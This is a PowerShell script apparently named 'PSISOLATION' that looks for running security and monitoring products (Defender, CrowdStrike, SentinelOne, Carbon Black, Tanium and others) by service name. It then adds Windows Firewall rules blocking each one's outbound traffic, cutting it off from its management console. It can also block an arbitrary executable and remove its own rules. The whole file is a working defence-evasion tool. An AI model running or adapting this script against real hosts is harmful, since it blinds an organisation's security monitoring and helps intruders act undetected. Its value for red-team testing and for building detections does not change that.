function Show-Banner {
    $banner = @"

██████╗ ███████╗██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██║██╔════╝██╔═══██╗██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██████╔╝███████╗██║███████╗██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██╔═══╝ ╚════██║██║╚════██║██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║     ███████║██║███████║╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝     ╚══════╝╚═╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

"@
    Write-Host $banner
}

# Define the list of keywords to detect in service DisplayNames
$MonitoringProc = @(
    "EDR", "F-Secure", "withsecure", "Defender", "Elastic", "Trellix", "Qualys", "Sentinel", "Crowdstrike", "csagent", "Cylance",
    "Cybereason", "Carbon Black", "CB Defense", "Tanium", "Cortex", "ESET", "Harfang", "Trend", "WinCollect"
)

# Name of the custom filter for identifying everything created by the script
$CustomFilterName = "Custom Outbound Rule"

# Function: Retrieve executable paths of services whose DisplayName contains any keyword
function Get-MatchedServicePaths {
    param (
        [string[]]$Keywords
    )

    $MatchedServices = @{}
    
    # Retrieve all services on the host
    $Services = Get-Service -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $DisplayName = $_.DisplayName
            $ServiceName = $_.Name
            
            # Check if the DisplayName contains any of the keywords
            if ($Keywords | Where-Object { $DisplayName -like "*$_*" }) {
                # Use WMI to retrieve the executable path of the service
                $Service = Get-WmiObject Win32_Service -Filter "Name='$ServiceName'"
                if ($Service -and $Service.PathName) {
                    # Extract the executable path, removing any quotes or arguments
                    $ExecutablePath = $Service.PathName.Split('"')[1]
                    if ($ExecutablePath) {
                        $MatchedServices[$ServiceName] = @{
                            DisplayName = $DisplayName
                            Path = $ExecutablePath
                        }
                    }
                }
            }
        } catch {
            Write-Warning "Failed to retrieve service details for: $_.Name. Error: $_"
        }
    }

    return $MatchedServices
}

# Function: Create firewall rules for identified processes
function Block-MonitoringProc {
    Show-Banner
    Write-Output "Checking for monitoring services..."

    # Get all matched services with their executable paths
    $MatchedServices = Get-MatchedServicePaths -Keywords $MonitoringProc

    if ($MatchedServices.Count -eq 0) {
        Write-Output "[-] No matching services detected."
        return
    }

    foreach ($ServiceName in $MatchedServices.Keys) {
        $ServiceDetails = $MatchedServices[$ServiceName]
        $ProcessPath = $ServiceDetails.Path
        $DisplayName = $ServiceDetails.DisplayName

        # Validate the executable path
        if (-not (Test-Path $ProcessPath)) {
            Write-Warning "Invalid executable path for service: $ServiceName ($ProcessPath). Skipping..."
            continue
        }

        # Validate DisplayName length to avoid firewall rule name length limit
        $FirewallDisplayName = "${CustomFilterName}: $DisplayName"
        if ($FirewallDisplayName.Length -gt 255) {
            $FirewallDisplayName = $FirewallDisplayName.Substring(0, 255)
        }

        Write-Output "Blocking outbound traffic for service: $DisplayName ($ProcessPath)"

        # Create a new firewall rule to block outbound traffic for this process
        try {
            New-NetFirewallRule -DisplayName $FirewallDisplayName `
                -Direction Outbound `
                -Action Block `
                -Program $ProcessPath `
                -Protocol Any `
                -Profile Any `
                -Description "Blocks outbound traffic for monitoring service $DisplayName"
            Write-Output "Successfully blocked traffic for service: $DisplayName."
        } catch {
            Write-Warning "Failed to block traffic for service: $DisplayName. $_"
        }
    }
}

# Function: Block a specific process's traffic based on full path
function Block-SpecificProcessTraffic {
param (
    [string]$ProcessPath
)
    Show-Banner
    # Validate the process path
    if (-not (Test-Path $ProcessPath)) {
        Write-Error "The specified process path does not exist: $ProcessPath"
        return
    }

    # Extract the process name from the path
    $ProcessName = [System.IO.Path]::GetFileName($ProcessPath)

    Write-Output "Blocking outbound traffic for process: $ProcessName"
    Write-Output "Executable Path: $ProcessPath"
    try {
        # Validate DisplayName length
        $FirewallDisplayName = "${CustomFilterName}: $ProcessName"
        if ($FirewallDisplayName.Length -gt 255) {
            $FirewallDisplayName = $FirewallDisplayName.Substring(0, 255)
        }

        # Create a new firewall rule
        New-NetFirewallRule -DisplayName $FirewallDisplayName `
            -Direction Outbound `
            -Action Block `
            -Program $ProcessPath `
            -Protocol Any `
            -Profile Any `
            -Description "Blocks outbound traffic for user-specified process $ProcessName"
        Write-Output "Successfully blocked traffic for process: $ProcessName."
    } catch {
        Write-Warning "Failed to block traffic for process: $ProcessName. $_"
    }
}


# Function: Remove all custom firewall rules created by the script
function Unblock-AllFilters {
    Show-Banner
    Write-Output "Removing all custom firewall rules..."

    # Find all firewall rules created by the script
    $Rules = Get-NetFirewallRule | Where-Object { $_.DisplayName -like "$CustomFilterName*" }

    if ($Rules.Count -eq 0) {
        Write-Output "[-] No custom firewall rules found."
        return
    }

    foreach ($Rule in $Rules) {
        try {
            Remove-NetFirewallRule -DisplayName $Rule.DisplayName
            Write-Output "Removed filter: $($Rule.DisplayName)"
        } catch {
            Write-Warning "Failed to remove filter $($Rule.DisplayName): $_"
        }
    }
}